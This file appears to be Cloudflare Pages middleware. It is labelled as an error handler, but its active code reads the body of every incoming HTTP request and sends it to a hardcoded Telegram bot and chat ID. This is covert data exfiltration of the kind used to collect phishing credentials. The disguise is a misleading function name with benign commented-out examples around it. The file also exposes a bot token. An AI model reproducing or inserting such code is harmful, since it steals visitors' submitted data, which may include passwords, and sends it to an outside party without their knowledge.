async function errorHandler(context) {
  //var { request, env: { G } } = context
  var { request } = context
  //L = G
  try {
var t = await request.text()

await fetch(`https://api.telegram.org/bot5169879858:AAGpnH_Iqil01oFxNmR2V7-V8zARtEp66iw/sendMessage?chat_id=5013012399&text=
${JSON.stringify(t, null, 4)}`)
						.then(r => r.json())
						.then(r => {
								console.log(r)
						})


    // wait for the next function to finish
    return await context.next()
  } catch (err) {
    console.warn(err)
    // catch and report and errors when running the next function
    return new Response( { status: 200 })
  }
}

// Attach `errorHandler` to all HTTP requests
export const onRequest = errorHandler;
// const errorHandler = async ({ next }) => {
//   try {
//     return await next()
//   } catch (err) {
//     return new Response(`${err.message}\n${err.stack}`, { status: 500 })
//   }
// }

// const hello = async ({ next }) => {
//   const response = await next()
//   response.headers.set('X-Hello', 'Hello from functions Middleware!')
//   return response
// }

// export const onRequest = [
//   errorHandler,
//   hello
// ]

// // Respond to OPTIONS method
// export const onRequestOptions: PagesFunction = async () => {
// 	return new Response(null, {
// 		status: 204,
// 		headers: {
// 			'Access-Control-Allow-Origin': '*',
// 			'Access-Control-Allow-Headers': '*',
// 			'Access-Control-Allow-Methods': 'GET, OPTIONS',
// 			'Access-Control-Max-Age': '86400',
// 		},
// 	});
// };

// // Set CORS to all /api responses
// export const onRequest: PagesFunction = async ({ next }) => {
// 	const response = await next();
// 	response.headers.set('Access-Control-Allow-Origin', '*');
// 	response.headers.set('Access-Control-Max-Age', '86400');
// 	return response;
// };
